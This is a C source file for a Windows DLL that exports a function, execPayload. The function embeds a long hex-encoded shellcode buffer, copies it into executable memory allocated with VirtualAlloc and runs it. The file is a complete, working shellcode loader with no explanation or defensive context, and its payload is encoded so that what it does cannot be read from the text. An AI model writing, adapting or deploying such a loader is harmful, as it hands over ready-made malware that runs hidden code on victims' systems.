
#include <stdio.h>
#include <Windows.h>

extern __declspec(dllexport) void execPayload() {
	unsigned char buf[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\xdf\xba\xc1\x41\xf7\x1f\x6a\xf7\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x23\xf2\x42"
		"\xa5\x07\xf7\xaa\xf7\xdf\xba\x80\x10\xb6\x4f\x38\xa6\x89"
		"\xf2\xf0\x93\x92\x57\xe1\xa5\xbf\xf2\x4a\x13\xef\x57\xe1"
		"\xa5\xff\xf2\x4a\x33\xa7\x57\x65\x40\x95\xf0\x8c\x70\x3e"
		"\x57\x5b\x37\x73\x86\xa0\x3d\xf5\x33\x4a\xb6\x1e\x73\xcc"
		"\x00\xf6\xde\x88\x1a\x8d\xfb\x90\x09\x7c\x4d\x4a\x7c\x9d"
		"\x86\x89\x40\x27\x94\xea\x7f\xdf\xba\xc1\x09\x72\xdf\x1e"
		"\x90\x97\xbb\x11\x11\x7c\x57\x72\xb3\x54\xfa\xe1\x08\xf6"
		"\xcf\x89\xa1\x97\x45\x08\x00\x7c\x2b\xe2\xbf\xde\x6c\x8c"
		"\x70\x3e\x57\x5b\x37\x73\xfb\x00\x88\xfa\x5e\x6b\x36\xe7"
		"\x5a\xb4\xb0\xbb\x1c\x26\xd3\xd7\xff\xf8\x90\x82\xc7\x32"
		"\xb3\x54\xfa\xe5\x08\xf6\xcf\x0c\xb6\x54\xb6\x89\x05\x7c"
		"\x5f\x76\xbe\xde\x6a\x80\xca\xf3\x97\x22\xf6\x0f\xfb\x99"
		"\x00\xaf\x41\x33\xad\x9e\xe2\x80\x18\xb6\x45\x22\x74\x33"
		"\x9a\x80\x13\x08\xff\x32\xb6\x86\xe0\x89\xca\xe5\xf6\x3d"
		"\x08\x20\x45\x9c\x08\x49\x68\x19\xc5\x80\x89\xf3\x41\xf7"
		"\x5e\x3c\xbe\x56\x5c\x89\xc0\x1b\xbf\x6b\xf7\xdf\xf3\x48"
		"\xa4\xbe\xa3\x68\xf7\xca\x09\x01\xe9\xcf\x79\x2b\xa3\x96"
		"\x33\x25\x0d\x7e\xee\x2b\x4d\x93\xcd\xe7\x46\x08\xca\x26"
		"\x7e\x35\xd2\xc0\x40\xf7\x1f\x33\xb6\x65\x93\x41\x2a\xf7"
		"\xe0\xbf\xa7\x8f\xf7\xf0\x88\xba\x2e\xaa\xbf\x20\x7a\x89"
		"\xc8\x35\x57\x95\x37\x97\x33\x00\x00\x4d\xf5\x65\x28\x3f"
		"\x45\x14\x09\x7e\xd8\x00\xe7\x9e\xe2\x8d\xc8\x15\x57\xe3"
		"\x0e\x9e\x00\x58\xe4\x83\x7e\x95\x22\x97\x3b\x05\x01\xf5"
		"\x1f\x6a\xbe\x67\xd9\xac\x25\xf7\x1f\x6a\xf7\xdf\xfb\x91"
		"\x00\xa7\x57\xe3\x15\x88\xed\x96\x0c\xc6\xdf\x00\xfa\x86"
		"\xfb\x91\xa3\x0b\x79\xad\xb3\xfb\xee\xc0\x40\xbf\x92\x2e"
		"\xd3\xc7\x7c\xc1\x29\xbf\x96\x8c\xa1\x8f\xfb\x91\x00\xa7"
		"\x5e\x3a\xbe\x20\x7a\x80\x11\xbe\xe0\xa2\xba\x56\x7b\x8d"
		"\xc8\x36\x5e\xd0\x8e\x13\x85\x47\xbe\x22\x57\x5b\x25\x97"
		"\x45\x0b\xca\xf9\x5e\xd0\xff\x58\xa7\xa1\xbe\x22\xa4\x9a"
		"\x42\x7d\xec\x80\xfb\x51\x8a\xd7\x6a\x20\x6f\x89\xc2\x33"
		"\x37\x56\xf1\xa3\xb0\x41\xba\x17\x6a\x6f\x4c\x98\xa9\xb3"
		"\x2e\x9d\x1f\x33\xb6\x56\x60\x3e\x94\xf7\x1f\x6a\xf7";


	void* exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec_mem, buf, sizeof buf);
	((void(*)())exec_mem)();

}



